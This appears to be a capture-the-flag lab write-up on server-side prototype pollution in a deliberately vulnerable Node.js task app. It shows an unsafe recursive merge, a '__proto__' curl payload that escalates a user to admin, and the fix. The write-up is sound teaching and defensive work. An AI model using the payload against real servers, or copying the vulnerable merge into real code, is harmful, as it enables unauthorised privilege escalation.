# Taskly — Prototype Pollution → Privilege Escalation (Node.js)

| | |
|---|---|
| **Vulnerability** | Server-side prototype pollution (via a recursive merge) |
| **Impact** | Privilege escalation — normal user → admin |
| **Difficulty** | ★★★ |
| **Approach** | Black-box + source review |

## Background — what prototype pollution is

In JavaScript every object inherits from a shared parent, `Object.prototype`. Reading a property that
an object doesn't own walks *up* to that shared parent. The special key `__proto__` points to it — so
if attacker input is used to **set** a key named `__proto__`, you write onto the shared parent, and
that property then appears on **every object** in the program. That's prototype pollution.

## The application

Taskly is a small team task board. You're signed in as a normal user (`alice`), and there's a locked
admin panel.

```bash
docker compose up -d        # http://localhost:9007
```

## The sink

The "update preferences" endpoint copies the request JSON into a server object with a **recursive
merge** that walks every attacker key, including `__proto__`:

```js
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object" && source[key] !== null) {
      merge(target[key], source[key]);   // recurses into target.__proto__ (the shared parent)
    } else {
      target[key] = source[key];
    }
  }
}
app.post("/api/preferences", (req, res) => { merge(user.prefs, req.body); ... });
```

## The gadget

The admin endpoint builds a fresh object and checks a property on it **without an own-property check**:

```js
app.get("/api/admin/flag", (req, res) => {
  const perms = {};                 // no own "isAdmin"
  if (perms.isAdmin === true) { /* grant */ }   // inherits a polluted value if the prototype is poisoned
});
```

## Exploitation

Two requests — pollute, then collect:

```bash
# 1) pollute Object.prototype.isAdmin through the merge
curl -X POST http://localhost:9007/api/preferences \
  -H "Content-Type: application/json" -d '{"__proto__":{"isAdmin":true}}'

# 2) the admin check's fresh object now inherits isAdmin = true
curl http://localhost:9007/api/admin/flag
```
```
FLAG{pr0t0typ3_p0llut10n_pr1v_3sc_v14_merg3}
```

## Root-cause fix

Pollution has two sides, and a complete fix addresses both:

**Sink (root cause) — stop arbitrary keys from being written.** Here the cleanest fix is a schema
allow-list: only accept the keys you actually expect, with the values you expect. `__proto__` (and
anything else) is simply never copied, so the prototype can't be touched:

```js
const PREF_SCHEMA = { theme: ["light","dark","sepia"], density: ["cozy","compact"] };
function validatePrefs(body) {
  const value = {};
  for (const key of Object.keys(PREF_SCHEMA)) {        // only allow-listed keys
    if (Object.hasOwn(body, key)) {
      if (!PREF_SCHEMA[key].includes(body[key])) return { error: `Invalid value for '${key}'.` };
      value[key] = body[key];
    }
  }
  return { value };
}
app.post("/api/preferences", (req, res) => {
  const { value, error } = validatePrefs(req.body);
  if (error) return res.status(400).json({ ok: false, error });
  Object.assign(user.prefs, value);
});
```

Other structural sink fixes: reject the keys `__proto__`/`constructor`/`prototype` in the merge, use
`Object.create(null)` (prototype-less) or a `Map` for untrusted data, and `Object.freeze(Object.prototype)`
as defense-in-depth.

**Gadget (defense-in-depth) — only trust an object's own property for a security decision:**

```js
if (Object.hasOwn(perms, "isAdmin") && perms.isAdmin === true) { /* grant */ }
```

Verified: the `__proto__` payload is ignored, the admin panel stays locked, and legitimate
preference updates still work.

## Key lesson

Same principle as SQLi/SSTI/command injection, in a new place: **keep untrusted input as data — only
let it fill known, expected fields — not as structure that can reach into the engine** (here, the
object prototype). And for the read side: make security decisions only on an object's *own*
properties, never inherited ones.
